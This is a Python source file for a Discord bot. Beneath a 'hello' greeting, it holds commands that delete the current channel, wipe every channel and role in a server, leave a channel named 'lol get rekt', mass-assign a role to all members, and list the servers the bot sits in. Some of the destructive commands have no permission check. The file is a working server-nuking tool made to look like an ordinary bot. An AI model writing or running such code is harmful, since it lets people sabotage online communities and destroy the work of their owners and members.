import discord
import os
from keep_alive import keep_alive

author = "din#7326"
client = discord.Client()

@client.event
async def on_ready():
    print("i have logged in as {0.user}".format(client))


@client.event
async def on_message(message):
    if message.author == client.user:
        return

    msg = message.content

    if msg.startswith('hello'):
        await message.channel.send("Hello!")

    if msg.startswith("ddelete"):
        await message.channel.delete()
        print(message.channel.name + " deleted")

    if msg.startswith("dddelete"):
        if str(message.author) == author:
            channels = message.guild.channels
            for channel in channels:
                await channel.delete()
                print(channel.name + " deleted")

            await message.guild.create_text_channel("lol get rekt")

    if msg.startswith("rroles"):
        roles = message.guild.roles
        for role in roles:
            if role.name != "@everyone":
                await role.delete()
                print(role.name + " deleted")

    if msg.startswith("llol"):
        role = await message.guild.create_role(name="lol", colour=discord.Colour.red(), hoist="true", mentionable="true")
      
        positions = {role: 1}
        await message.guild.edit_role_positions(positions=positions)
      
        print("added role")
        members = message.guild.members
        for member in members:
          await member.add_roles(role)

    if msg.startswith("rreborn"):
        await message.guild.create_text_channel(message.channel.name)
        await message.channel.delete()
        print(message.channel.name + " reborn")


    if msg.startswith("serverlist"):
        for guild in client.guilds:
            print(guild.name)

    
keep_alive()

token = os.environ['TOKEN']
client.run(token)
